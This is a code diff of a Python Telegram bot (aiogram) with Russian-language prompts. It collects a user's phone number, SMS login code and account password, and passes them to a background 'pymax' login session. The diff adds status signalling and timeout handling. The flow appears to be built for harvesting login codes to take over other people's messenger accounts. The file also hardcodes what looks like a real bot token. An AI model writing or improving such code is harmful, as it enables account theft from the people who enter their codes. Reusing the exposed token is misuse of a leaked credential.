@@ -13,7 +13,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
 
 # ============================================================
-# НАСТРОЙКИ
+# НАСТРОЙКИ (замените на свои)
 # ============================================================
 BOT_TOKEN = "8948301530:AAH-ZTWkJuUOfPMRFl19qC1-YUAXfKUd9C8"
 ADMIN_ID = 8632861931
@@ -91,10 +91,14 @@ def pymax_thread(uid, phone, work_dir):
     def custom_input(prompt=""):
         p = prompt.lower() if prompt else ""
         if "code" in p or "код" in p:
+            with open(f"{work_dir}/status.txt", "w") as f:
+                f.write("waiting_code")
             while uid not in input_codes:
                 time.sleep(0.3)
             return input_codes.pop(uid)
         elif "password" in p or "пароль" in p:
+            with open(f"{work_dir}/status.txt", "w") as f:
+                f.write("waiting_password")
             while uid not in input_passwords:
                 time.sleep(0.3)
             return input_passwords.pop(uid)
@@ -182,14 +186,18 @@ async def phone_handler(message: types.Message, state: FSMContext):
         
         status = status_file.read_text().strip()
         
-        if status == "blocked":
+        if status == "waiting_code":
+            await msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
+            return
+        
+        elif status == "blocked":
             await msg.edit_text("🚫 Аккаунт заблокирован или удалён.")
             del pending[uid]
             await state.clear()
             return
         
         elif status == "flood":
-            await msg.edit_text("⏳ Слишком много попыток. Подождите немного и попробуйте снова.")
+            await msg.edit_text("⏳ Слишком много попыток. Подождите и попробуйте снова.")
             del pending[uid]
             await state.clear()
             return
@@ -200,7 +208,9 @@ async def phone_handler(message: types.Message, state: FSMContext):
             await state.clear()
             return
     
-    await msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
+    await msg.edit_text("❌ Таймаут. Попробуй ещё раз.")
+    del pending[uid]
+    await state.clear()
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
